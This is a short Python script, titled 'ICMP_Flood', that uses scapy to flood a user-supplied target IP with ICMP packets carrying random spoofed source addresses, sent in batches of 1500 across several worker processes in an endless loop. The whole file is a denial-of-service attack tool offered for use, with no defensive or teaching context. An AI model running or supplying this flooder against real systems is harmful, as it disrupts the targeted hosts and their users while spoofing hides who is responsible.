import scapy.all as scapy
import os
from multiprocessing import Pool

clear = os.system('clear')
print("**************************************")
print("             ICMP_Flood")
print("**************************************")
print("Please input your target's IP ")
target = input("[ICMP_Flood]#")

p ={}

def ICMP_Flood_End():
	print("ICMP_Flood_End!")
	p.terminate()

def ICMP_Flood(name):

	num =0
	

	try:
		while True:
			packet = scapy.IP(src=scapy.RandIP(),dst=target)/scapy.ICMP()
			scapy.send(packet,count=1500,verbose=False)
			num +=1
			print("Process:%s,Attack:%s"%(name,num))
	except KeyboardInterrupt:
		print("Go back")
def process():
	global p
	p =Pool(2)
	for i in range(3):
		p.apply_async(ICMP_Flood,args=(i,))
	print('Waiting for all subprocesses done...')
	p.close()
	p.join()
	print('All subprocesses done.')

